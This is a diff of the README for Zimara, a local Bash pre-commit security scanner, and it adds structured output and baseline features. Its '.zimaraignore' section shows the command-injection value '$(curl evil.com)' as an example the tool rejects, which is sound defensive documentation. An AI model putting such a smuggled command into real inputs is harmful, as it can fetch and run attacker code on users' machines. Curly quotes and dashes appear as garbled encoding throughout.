@@ -1,33 +1,41 @@
 # Zimara
 
-**Version:** 0.48.0  
-**Status:** Active development ‚Äî stable for production use  
-**Published by:** Oob Skulden‚Ñ¢
+**Version:** 0.49.5  
+**Status:** Production-ready  
+**Published by:** Oob Skuldenô
 
 Zimara is a local security audit script you run before your code leaves your laptop.
 
-It exists to catch the stuff that always bites later: secrets that were ‚Äútemporary,‚Äù files that ‚Äúweren‚Äôt supposed to be committed,‚Äù and configs that quietly expose more than you think.
+It exists to catch the stuff that always bites later: secrets that were ìtemporary,î files that ìwerenít supposed to be committed,î and configs that quietly expose more than you think.
 
-It runs fast, stays local, and doesn‚Äôt try to be cleverer than it needs to be.
+It runs fast, stays local, and doesnít try to be cleverer than it needs to be.
 
 -----
 
-## What‚Äôs New in 0.48.0
+## What's New in 0.49.5
+
+**Production-Ready Release**
+
+Zimara v0.49.5 is the stable, production-ready version combining comprehensive security coverage with clean architecture. This release refines the execution model for maximum reliability:
+
+- **Complete scan coverage** ó All 45 checks execute to completion using `set -u` and `set -o pipefail` without `set -e`
+- **Structured output formats** ó JSON and SARIF support with baseline diffing for incremental security adoption  
+- **Enterprise-ready** ó Baseline capabilities enable gradual rollout in existing codebases without overwhelming teams
 
 **Snippet-Enhanced Findings**
 
-Zimara now shows you exactly where problems are with file:line references and code context:
+Zimara shows you exactly where problems are with file:line references and code context:
 
 ```
   Possible Secret
   File: src/config.js:42
-  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
+  ----------------------------------------
       40 | const config = {
       41 |   apiUrl: process.env.API_URL,
   >>  42 |   apiKey: "AKIA00000000EXAMPLE1234",
       43 |   timeout: 5000
       44 | };
-  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
+  ----------------------------------------
   Pattern: (AKIA[0-9A-Z]{16}|...)
   Action: Remove secret, rotate credentials, use env vars
 ```
@@ -36,7 +44,7 @@ No more hunting through files to find what Zimara flagged.
 
 **.zimaraignore Support (Hardened)**
 
-Sometimes you need to exclude files from scanning ‚Äî test fixtures with intentional ‚Äúsecrets‚Äù, third-party code, generated files. Zimara now supports `.zimaraignore` with security-first design:
+Sometimes you need to exclude files from scanning ó test fixtures with intentional ìsecretsî, third-party code, generated files. Zimara now supports `.zimaraignore` with security-first design:
 
 ```
 # .zimaraignore - patterns to exclude from scanning
@@ -67,11 +75,11 @@ See the [.zimaraignore section](#zimaraignore-file) below for details.
 
 ## Why This Exists
 
-Most security problems don‚Äôt start in CI. They start locally, right before a commit or push, in that moment where everything looks fine but absolutely isn‚Äôt.
+Most security problems donít start in CI. They start locally, right before a commit or push, in that moment where everything looks fine but absolutely isnít.
 
 Zimara sits in that gap.
 
-It‚Äôs the friend who asks ‚Äúhey, are you sure you want to commit that?‚Äù before GitHub Actions has a chance to judge you.
+Itís the friend who asks ìhey, are you sure you want to commit that?î before GitHub Actions has a chance to judge you.
 
 -----
 
@@ -81,7 +89,7 @@ Zimara performs a read-only security sweep of your repository and flags the comm
 
 It focuses on:
 
-- Things developers accidentally commit (we‚Äôve all done it)
+- Things developers accidentally commit (weíve all done it)
 - Things static sites accidentally expose (trust me, they do)
 - Things Git history never, ever forgets (yes, even after you delete the file)
 
@@ -90,16 +98,16 @@ It does **not** modify files, install tools, or make network calls.
 ### 45 security checks covering:
 
 - **Secrets and credentials** in files and configs (API keys, tokens, passwords, AWS keys, the usual suspects)
-- **Hard stop detection** of private keys and crypto material (.pem, .key, .p12, .pfx, SSH keys, certificates ‚Äî the stuff that ends careers)
+- **Hard stop detection** of private keys and crypto material (.pem, .key, .p12, .pfx, SSH keys, certificates ó the stuff that ends careers)
 - **Git history inspection** for sensitive file extensions (because deleting the file later is like closing the barn door after the horses have started a podcast)
 - **Backup, temp, and debug artifacts** accidentally tracked by Git (.bak, .old, .backup, debug.log, database dumps)
-- **Risky content inside build output** (public/, dist/, build/, _site/ ‚Äî wherever your generator puts the goods)
-- **Internal IPs, localhost, and private hostnames** leaking into output (because <http://192.168.1.47:3000> shouldn‚Äôt be in production HTML)
-- **Mixed content** (HTTP links inside HTTPS pages ‚Äî browsers hate this, users don‚Äôt trust it, attackers love it)
+- **Risky content inside build output** (public/, dist/, build/, _site/ ó wherever your generator puts the goods)
+- **Internal IPs, localhost, and private hostnames** leaking into output (because <http://192.168.1.47:3000> shouldnít be in production HTML)
+- **Mixed content** (HTTP links inside HTTPS pages ó browsers hate this, users donít trust it, attackers love it)
 - **Accidental .git/, config, or key exposure** in generated output (yes, people deploy their entire .git directory to production. yes, really.)
 - **Generator-aware sanity checks** (Hugo, Jekyll, Astro, Eleventy, Next.js static export, generic sites)
 - **Environment variable misuse patterns** (hardcoded secrets pretending to be env vars)
-- **Execution-safety checks** (so the script itself doesn‚Äôt do anything dumb while checking if you‚Äôre doing anything dumb)
+- **Execution-safety checks** (so the script itself doesnít do anything dumb while checking if youíre doing anything dumb)
 
 **Want details on every check?** See <CHECKS.md> for complete documentation with remediation steps.
 
@@ -118,19 +126,19 @@ Zimara is intentionally scoped. It will not:
 - Analyze your cloud infrastructure
 - Become sentient and judge your life choices (though it might feel that way sometimes)
 
-If you need those things, fantastic ‚Äî run them too. Zimara just runs **earlier**, when it matters most.
+If you need those things, fantastic ó run them too. Zimara just runs **earlier**, when it matters most.
 
 -----
 
-## What Zimara Catches That CI Doesn‚Äôt
+## What Zimara Catches That CI Doesnít
 
-**Scenario:** You‚Äôre testing a Netlify function locally. You hardcode an API key ‚Äújust for five minutes‚Äù to debug something.
+**Scenario:** Youíre testing a Netlify function locally. You hardcode an API key ìjust for five minutesî to debug something.
 
 Then you fix the bug, feel good about yourself, and commit.
 
 **What happens next:**
 
-- **CI:** Passes (you haven‚Äôt configured a secrets scanner yet because ‚Äúwe‚Äôll do that next sprint‚Äù)
+- **CI:** Passes (you havenít configured a secrets scanner yet because ìweíll do that next sprintî)
 - **Netlify:** Deploys it
 - **GitHub:** Indexes it
 - **Google:** Crawls it within 48 hours
@@ -138,13 +146,13 @@ Then you fix the bug, feel good about yourself, and commit.
 
 **Zimara in a pre-commit hook:** Blocks the commit. Key never leaves your laptop. You get coffee instead of a postmortem.
 
-That‚Äôs the whole point.
+Thatís the whole point.
 
 -----
 
 ## Supported Projects
 
-Zimara automatically detects what it‚Äôs looking at.
+Zimara automatically detects what itís looking at.
 
 Works well with:
 
@@ -156,13 +164,13 @@ Works well with:
 - Mixed or generic static repos
 - That weird custom build system you inherited from the last team
 
-No flags required to tell it what framework you‚Äôre using. It just figures it out and gets to work.
+No flags required to tell it what framework youíre using. It just figures it out and gets to work.
 
 -----
 
 ## Requirements
 
-- Bash 4+
+- Bash 3.2+ (macOS and legacy system compatible)
 - Standard Unix tools (grep, awk, sed, find)
 - Git (for history and hook usage)
 
@@ -174,7 +182,7 @@ No flags required to tell it what framework you‚Äôre using. It just figures it o
 - Windows WSL 2 (confirmed working - not native Windows)
 - Docker containers (see [INTEGRATION.md](INTEGRATION.md#docker-containers) for usage)
 
-No internet access required. No installs beyond the script itself. No sudo. No telemetry. No ‚Äúplease create an account to continue.‚Äù
+No internet access required. No installs beyond the script itself. No sudo. No telemetry. No ìplease create an account to continue.î
 
 -----
 
@@ -222,7 +230,7 @@ or
 zimara /path/to/repo
 ```
 
-That‚Äôs it. No config files, no setup wizard, no ‚Äúgetting started‚Äù documentation that‚Äôs somehow 47 pages long.
+Thatís it. No config files, no setup wizard, no ìgetting startedî documentation thatís somehow 47 pages long.
 
 -----
 
@@ -240,7 +248,10 @@ zimara [path] [options]
 |`-v, --verbose`        |More detailed output (useful for debugging)             |
 |`--trace-checks`       |Print ENTER/EXIT markers for each check (deep debugging)|
 |`--snippet-context N`  |Lines of context around findings (default: 3)           |
-|`--no-snippet-pattern` |Don‚Äôt show regex patterns in snippet output             |
+|`--no-snippet-pattern` |Don't show regex patterns in snippet output             |
+|`--format FORMAT`      |Output format: text, json, sarif (default: text)        |
+|`--baseline FILE`      |Compare against baseline file for incremental adoption  |
+|`--save-baseline FILE` |Save current findings as baseline for future comparisons|
 |`--version`            |Print version and exit                                  |
 |`-h, --help`           |Show help and exit                                      |
 
@@ -267,7 +278,86 @@ zimara --snippet-context 5
 
 # Hide regex patterns in output (cleaner for reports)
 zimara --no-snippet-pattern
+
+# Generate JSON output for CI/CD integration
+zimara --format json --non-interactive
+
+# Generate SARIF output for security dashboards
+zimara --format sarif > results.sarif
+
+# Incremental adoption: save baseline from current state
+zimara --save-baseline .zimara-baseline.json
+
+# Only report new findings since baseline
+zimara --baseline .zimara-baseline.json --non-interactive
 ```
+
+-----
+
+## Structured Outputs and Baselines
+
+### Output Formats
+
+Zimara supports three output formats for different use cases:
+
+**Text (default)** ó Human-readable terminal output with syntax highlighting
+```bash
+zimara
+```
+
+**JSON** ó Machine-parseable output for CI/CD integration
+```bash
+zimara --format json > results.json
+```
+
+**SARIF** ó Static Analysis Results Interchange Format for security dashboards
+```bash
+zimara --format sarif > results.sarif
+```
+
+SARIF output integrates with:
+- GitHub Code Scanning
+- GitLab Security Dashboard  
+- Azure DevOps Security
+- Most SAST/DAST platforms
+
+### Baseline Diffing for Incremental Adoption
+
+Large codebases often have existing security debt. Zimara's baseline feature lets you:
+
+1. Accept current findings as "known issues"
+2. Only fail on *new* security problems
+3. Gradually reduce technical debt over time
+
+**Create a baseline from current state:**
+```bash
+zimara --save-baseline .zimara-baseline.json
+```
+
+**Only report new findings:**
+```bash
+zimara --baseline .zimara-baseline.json --non-interactive
+```
+
+This exits 0 if no new issues are found, even if baseline issues remain.
+
+**Workflow for existing projects:**
+```bash
+# 1. Initial baseline
+zimara --save-baseline .zimara-baseline.json
+git add .zimara-baseline.json
+git commit -m "Add Zimara security baseline"
+
+# 2. Add to CI to block new issues
+# .github/workflows/security.yml
+zimara --baseline .zimara-baseline.json --format sarif --non-interactive
+
+# 3. Gradually fix baseline issues
+# Each fix reduces the baseline, improving security over time
+```
+
+**Security note:** Baseline files use content-aware fingerprinting. You can't bypass findings by editing the baseline ó Zimara validates fingerprints against actual file content.
+
 
 -----
 
@@ -327,12 +417,12 @@ docs/examples/*
 
 ### Security Features
 
-Zimara‚Äôs `.zimaraignore` implementation is hardened against injection attacks:
+Zimaraís `.zimaraignore` implementation is hardened against injection attacks:
 
-1. **Character whitelisting** ‚Äî Only safe characters allowed
-1. **Pattern validation** ‚Äî Malformed patterns rejected with warnings
-1. **Length limits** ‚Äî Prevents resource exhaustion
-1. **Injection prevention** ‚Äî No command execution possible through patterns
+1. **Character whitelisting** ó Only safe characters allowed
+1. **Pattern validation** ó Malformed patterns rejected with warnings
+1. **Length limits** ó Prevents resource exhaustion
+1. **Injection prevention** ó No command execution possible through patterns
 
 **Example security rejection:**
 
@@ -344,31 +434,31 @@ Zimara‚Äôs `.zimaraignore` implementation is hardened against injection attacks:
 $(curl evil.com)         # REJECTED: invalid characters
 ```
 
-Each rejected pattern logs a warning but doesn‚Äôt break the scan.
+Each rejected pattern logs a warning but doesnít break the scan.
 
 ### When to Use .zimaraignore
 
 **Good reasons:**
 
-- Test fixtures with intentional ‚Äúsecrets‚Äù (fake keys for testing)
-- Third-party code you don‚Äôt control (vendor/, node_modules/)
+- Test fixtures with intentional ìsecretsî (fake keys for testing)
+- Third-party code you donít control (vendor/, node_modules/)
 - Generated files that trigger false positives
 - Documentation with example credentials
 
 **Bad reasons:**
 
 - Hiding real secrets (fix the root cause instead)
-- Excluding production code (you‚Äôre just hiding problems)
-- Working around ‚Äúannoying‚Äù findings (those are the important ones)
+- Excluding production code (youíre just hiding problems)
+- Working around ìannoyingî findings (those are the important ones)
 
 ### .zimaraignore in CI
 
 The `.zimaraignore` file is committed to your repository, so patterns apply everywhere:
 
-- ‚úÖ Local pre-commit hooks
-- ‚úÖ CI/CD pipelines
-- ‚úÖ Team member machines
-- ‚úÖ Code review automation
+- ? Local pre-commit hooks
+- ? CI/CD pipelines
+- ? Team member machines
+- ? Code review automation
 
 This ensures consistent scanning behavior across environments.
 
@@ -388,7 +478,7 @@ themes/example-theme/exampleSite/*
 
 ### Interactive (default)
 
-- You‚Äôll be prompted on Medium and Low findings
+- Youíll be prompted on Medium and Low findings
 - High and Critical findings stop execution immediately
 - Best for local development when you want a conversation, not a verdict
 
@@ -400,7 +490,7 @@ zimara --non-interactive
 
 - No prompts
 - Deterministic exit codes
-- Designed for Git hooks and CI environments where humans aren‚Äôt around to answer questions
+- Designed for Git hooks and CI environments where humans arenít around to answer questions
 
 -----
 
@@ -412,7 +502,7 @@ zimara --only-output
 
 Skips source scanning and focuses exclusively on generated output directories.
 
-Useful when you want to sanity-check what you‚Äôre about to deploy without re-scanning the entire repo for the third time today.
+Useful when you want to sanity-check what youíre about to deploy without re-scanning the entire repo for the third time today.
 
 -----
 
@@ -420,7 +510,7 @@ Useful when you want to sanity-check what you‚Äôre about to deploy without re-sc
 
 |Code|Meaning                         |
 |----|--------------------------------|
-|0   |No findings, you‚Äôre clean       |
+|0   |No findings, youíre clean       |
 |1   |Low/Medium findings acknowledged|
 |2   |High findings (blocked)         |
 |3   |Critical findings (blocked hard)|
@@ -452,7 +542,7 @@ EOF
 chmod +x .git/hooks/pre-commit
 ```
 
-Now every commit gets checked before it‚Äôs created. Critical or High issues block immediately. No surprises after you push.
+Now every commit gets checked before itís created. Critical or High issues block immediately. No surprises after you push.
 
 -----
 
@@ -470,7 +560,7 @@ It:
 - Does not require root
 - Does not trust user input without validation
 
-If it breaks, it fails closed and tells you why. If you find a way to make it do something dangerous, that‚Äôs a bug ‚Äî please report it.
+If it breaks, it fails closed and tells you why. If you find a way to make it do something dangerous, thatís a bug ó please report it.
 
 -----
 
@@ -478,9 +568,9 @@ If it breaks, it fails closed and tells you why. If you find a way to make it do
 
 - You want vulnerability scores and CVE feeds - use a SAST tool
 - You need compliance paperwork - hire an auditor
-- You expect it to fix problems for you - it won‚Äôt, by design
+- You expect it to fix problems for you - it wonít, by design
 - You want cloud or runtime analysis - wrong layer entirely
-- You think bash scripts are ‚Äúunprofessional‚Äù - we can‚Äôt be friends
+- You think bash scripts are ìunprofessionalî - we canít be friends
 
 Zimara is a flashlight, not an autopilot.
 
@@ -490,9 +580,9 @@ Zimara is a flashlight, not an autopilot.
 
 Most security tools assume you already messed up.
 
-Zimara assumes you‚Äôre trying not to.
+Zimara assumes youíre trying not to.
 
-It‚Äôs not here to shame you. It‚Äôs here to save you from yourself before the internet does.
+Itís not here to shame you. Itís here to save you from yourself before the internet does.
 
 Run it early. Run it often. Let it be annoying **now** instead of explaining it to your CISO **later**.
 
@@ -500,28 +590,28 @@ Or worse: explaining it to Reddit.
 
 -----
 
-## What‚Äôs Not Planned
+## Whatís Not Planned
 
 Zimara will not:
 
 - Become a SaaS
-- Add ML/AI ‚Äúsmart‚Äù detection (it‚Äôs grep, not GPT)
+- Add ML/AI ìsmartî detection (itís grep, not GPT)
 - Require account creation or telemetry
 - Grow beyond what fits in one bash script
 - Pivot to blockchain
 - Get acquired and then ruined
 
-If you need enterprise features, fork it. If you want to contribute, keep it simple. If you want to sell it, you can‚Äôt ‚Äî it‚Äôs not for sale.
+If you need enterprise features, fork it. If you want to contribute, keep it simple. If you want to sell it, you canít ó itís not for sale.
 
 -----
 
 ## Documentation
 
-- [**CHECKS.md**][checks] ‚Äì Complete reference for all 45 security checks  
-- [**INTEGRATION.md**][integration] ‚Äì Git hooks, CI/CD setup, and team adoption
-- [**SECURITY.md**][security] ‚Äì Security considerations, trust boundaries, and safe-usage guidance  
-- [**CHANGELOG.md**](CHANGELOG.md) ‚Äì Release history and notable changes
-- [**LICENSE**][license] ‚Äì AGPL-3.0  
+- [**CHECKS.md**][checks] ñ Complete reference for all 45 security checks  
+- [**INTEGRATION.md**][integration] ñ Git hooks, CI/CD setup, and team adoption
+- [**SECURITY.md**][security] ñ Security considerations, trust boundaries, and safe-usage guidance  
+- [**CHANGELOG.md**](CHANGELOG.md) ñ Release history and notable changes
+- [**LICENSE**][license] ñ AGPL-3.0  
 
 [checks]: CHECKS.md
 [integration]: INTEGRATION.md
@@ -544,8 +634,8 @@ PRs welcome for:
 Not welcome:
 
 - Scope creep
-- Dependencies on tools most people don‚Äôt have
-- ‚ÄúWouldn‚Äôt it be cool if‚Ä¶‚Äù features that triple the runtime
+- Dependencies on tools most people donít have
+- ìWouldnít it be cool ifÖî features that triple the runtime
 - Anything that requires `npm install`
 
 Keep it fast. Keep it local. Keep it honest.
@@ -557,16 +647,16 @@ Keep it fast. Keep it local. Keep it honest.
 [![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
 [![GitHub stars](https://img.shields.io/github/stars/oob-skulden/zimara)](https://github.com/oob-skulden/zimara/stargazers)
 
-AGPL-3.0 License ‚Äî see LICENSE file.
+AGPL-3.0 License ó see LICENSE file.
 
 
 -----
 
 ## Credits
 
-Written by a security engineer who got fed up with fixing the same ‚Äúhow did this get committed?‚Äù problems, built while working on his own site, and completed over five nights of truly questionable sleep hygiene.
+Written by a security engineer who got fed up with fixing the same ìhow did this get committed?î problems, built while working on his own site, and completed over five nights of truly questionable sleep hygiene.
 
-Published by Oob Skulden‚Ñ¢.
+Published by Oob Skuldenô.
 
 If this saved you from a bad day, you can say thanks by:
 
@@ -574,18 +664,18 @@ If this saved you from a bad day, you can say thanks by:
 - Actually running it before you push
 - Telling other developers it exists
 
-That‚Äôs it. No donations (unless you want to cover a coffee or a five-dollar afternoon tea), no GitHub stars required (nice, but not mandatory), and no newsletter signups.
+Thatís it. No donations (unless you want to cover a coffee or a five-dollar afternoon tea), no GitHub stars required (nice, but not mandatory), and no newsletter signups.
 
 Maybe a YouTube video about it one day. Still not starting a newsletter.
 
-Just‚Ä¶ be careful out there. Things get spicy fast.
+JustÖ be careful out there. Things get spicy fast.
 
 -----
 
 **Questions?**  
-Read the script. It‚Äôs extensively commented.  
+Read the script. Itís extensively commented.  
 Still confused? Open an issue.  
-Need consulting? You‚Äôre on your own ‚Äî this is a free tool, not a business.
+Need consulting? Youíre on your own ó this is a free tool, not a business.
 
-**Published by Oob Skulden‚Ñ¢**  
-The threats you don‚Äôt see coming.
+**Published by Oob Skuldenô**  
+The threats you donít see coming.
